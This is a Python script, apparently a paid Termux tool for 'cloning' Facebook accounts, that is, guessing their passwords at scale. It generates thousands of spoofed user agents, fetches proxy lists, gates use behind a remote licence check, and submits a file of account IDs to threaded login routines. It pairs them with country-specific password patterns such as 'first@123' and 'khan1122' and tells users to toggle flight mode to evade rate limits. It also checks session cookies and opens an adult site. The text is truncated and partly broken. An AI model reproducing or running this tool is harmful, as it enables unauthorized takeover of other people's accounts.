print('CMD BY AADITYA 🪨')
#--------------------------------------------------------------------------#

fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python prajjwal.py')


        	
print('[•] Join Our Group')
#os.system('xdg-open https://facebook.com/groups/1267077887495034/')

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] IT LOAD SOME TIME JUST PATIENT...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 5G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
def SIU():
    END = 'Mozilla/5.0 (Linux; Android 9: 10; Linux; Android 9:L4045I AppleWebKit/537.36 (KHTML, like Gecko)101 0 6092 69 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 10; Linux; Android 9:Z8018J AppleWebKit/537.36 (KHTML, like Gecko)92 0 6349 65 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 10; Linux; Android 9:P9194A AppleWebKit/537.36 (KHTML, like Gecko)80 0 6631 76 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    ua = 'Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:T2747M AppleWebKit/537.36 (KHTML, like Gecko)100 0 6506 111 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:T2628Y AppleWebKit/537.36 (KHTML, like Gecko)93 0 6057 67 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9: 9; Linux; Android 9:N4869C AppleWebKit/537.36 (KHTML, like Gecko)93 0 5683 49 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua    
#-------------------------logo----------------------------#

os.system('xdg-open pronhub.com ')

logo=
 _______                                                               __ 
/       \                                                             /  |
$$$$$$$  | ______   ______       __        __  __   __   __   ______  $$ |
$$ |__$$ |/      \ /      \     /  |      /  |/  | /  | /  | /      \ $$ |
$$    $$//$$$$$$  |$$$$$$  |    $$/       $$/ $$ | $$ | $$ | $$$$$$  |$$ |
$$$$$$$/ $$ |  $$/ /    $$ |    /  |      /  |$$ | $$ | $$ | /    $$ |$$ |
$$ |     $$ |     /$$$$$$$ |    $$ |      $$ |$$ \_$$ \_$$ |/$$$$$$$ |$$ |
$$ |     $$ |     $$    $$ |    $$ |      $$ |$$   $$   $$/ $$    $$ |$$ |
$$/      $$/       $$$$$$$/__   $$ | __   $$ | $$$$$/$$$$/   $$$$$$$/ $$/ 
                          /  \__$$ |/  \__$$ |                            
                          $$    $$/ $$    $$/                             
                           $$$$$$/   $$$$$$/                              
                           
                                             

\033[1;32m<><><><><><><><><<><><><><><><><><><><><><><>

 [<>] \033[1;32mOWNER   :  PRAJJWAL

 [<>] \033[1;32mGITHUB  :  PRAJJWAL

 [<>] \033[1;32mSTATUS  :  PAID

 [<>] \033[1;32mTOOLS   :  FILE  ONLY

 [<>] \033[1;32mVERSION :  \033[1;32m 0.1\033[1;32m \033[1;37m

\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>

\033[1;32m═══════════════════════════════════════════════""")
def linex():
	print(50*'_')
def clear():
	os.system('clear')
	print(logo)
	#--------------------[APPROVAL]----------#
os.system('clear')
print(logo)
def meyexudi():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "x".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/aadifromtb/aadifromtb-/blob/main/prajjwal.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:  	
      print(' \x1b[1;97m[•] PER MONTH APPROVAL COST NRP 1000')
      print(' \x1b[1;97m[•] PER WEEK APPROVAL COST NRP 300')
      linex()
      print(' \x1b[1;97m[•] WI-FI AND DATA BOTH WORKING')
      linex()
      print(f" \033[1;37m[•] YOUR KEY :\033[1;36m "+id)
      linex()
      input(' \033[1;37m[•] IF U WANT TO BUY THEN MSG ')
      contact(),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

# ANSI escape codes for colors and fo
def cek_apk(kuki):
    session = requests.Session()
    
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": "noscript=1;" + kuki}).text
    soup = BeautifulSoup(w, "html.parser")
    forms = soup.find_all("form", method="post")
    games = [i.text for form in forms for i in form.find_all("h3")]
    try:
        for game in games:
            print("\r\033[92m• %s" % game.replace("Added on", " Added on"))
    except AttributeError:
        print("\r\033[91mcookie invalid")
    
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": "noscript=1;" + kuki}).text
    soup = BeautifulSoup(w, "html.parser")
    forms = soup.find_all("form", method="post")
    games = [i.text for form in forms for i in form.find_all("h3")]
    try:
        for game in games:
            print("\r• %s" % game.replace("Expired on", " Expired on"))
    except AttributeError:
        print("\rCᴏᴏᴋɪᴇ Iɴᴠᴀʟɪᴅ...")
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def menu():
			clear()	
		
			linex()		 	
			print(" ")	   
			print(' \033[1;31m[\033[1;37m1\033[1;31m] \033[1;33mFile cloning\n \033[1;31m[\033[1;37m2\033[1;31m] \033[1;32mRandom cloning  👉(Coming soon)\n \033[1;31m[\033[1;37m3\033[1;31m] \033[1;33mgmail cloning   👉(Coming soon)\n \033[1;31m[\033[1;37m4\033[1;31m] \033[1;32mjoin whatsap group \n \033[1;31m[\033[1;37m0\033[1;31m] \033[1;33mExit menu')		
		#	print(' \033[1;31m[\033[1;37m1\033[1;31m] \033[1;37mFile cloning')	
			linex()
			print(" ")
			xd=input(' Choose an option: ')
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/durga.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				print(' All method working ')
				#print( 'Today update m1 ')
				linex()			
				#print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast) \n\033[1;33m [4]\033[1;37m Method  (for new ids)\033[1;32m   (best) \n \033[1;33m[5] \033[1;37mMethod  (for new ids) \033[1;32m  () \n \033[1;33m[6] \033[1;37mMethod  (for new ids) \n \033[1;33m[7] \033[1;37mMethod  (for new ids) \n \033[1;33m[8] \033[1;37mMethod  (for new ids) ')
				print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast) ')
			#	print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)')
				linex()
				mthd=input(' Choose: ')
				linex()
				clear()
				plist = []					
				print('\033[1;37m ')
				print('[1] Nepal password ')	
				print('[2] Pakistan password ')
				print('[3] India password ')		
				#print('------------------------------')
				print ('[4] Philippines password ')
				linex()	
				pcx = input(' Choose: ')
				linex()
				if pcx in ['1','01']:
					plist = ['first','first11','first12','first123','first1234','first12345','first@11','first@12','first@123','first@1234','first@12345','firstlast123','@first123','first123@','last@123','maya@123','maya123','first last']										
				elif pcx in ['2','02']:
				     plist = ['first007', 'first777', 'first786', 'first786786', 'first1122', 'first12345', 'firstlast', 'first last', 'firstlast123', 'firstlast12345', 'firstlast007', 'firstlast1122', 'firstlast786', 'khan1122', 'pak12345', 'khan007', 'khankhan', 'Khan112233']
				elif pcx in ['3','03']:
				     plist = ['first123','first1234','first12345','first143','last143','firstlast123','lastfirst123','last123','Firstlast123','first06','first08','First123','First12345','last']				          	
				elif pcx in ['4','04']:	
				     plist = ['first123','first1234','first12345','first143','last143','firstlast123','lastfirst123','last123','Firstlast123','first06','first08','First123','First12345','last']				       			
				clear()
										   			        					   
				print(' Do you went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' Total account ids : \033[1;32m'+total_ids+f' ')
					print(' \033[1;32mThe process is running in the background')
					print('Note👉USE FLIGHT ✈️ MODE EVERY 5 MIN')
					linex()							      					    
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(api1,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(api2,ids,names,passlist)
						elif mthd in ['3','03']:
							crack_submit.submit(api3,ids,names,passlist)
						elif mthd in ['4','04']:
							crack_submit.submit(api4,ids,names,passlist)
						elif mthd in ['5','05']:
							crack_submit.submit(api5,ids,names,passlist)
						elif mthd in ['6','06']:
							crack_submit.submit(api6,ids,names,passlist)
						elif mthd in ['7','07
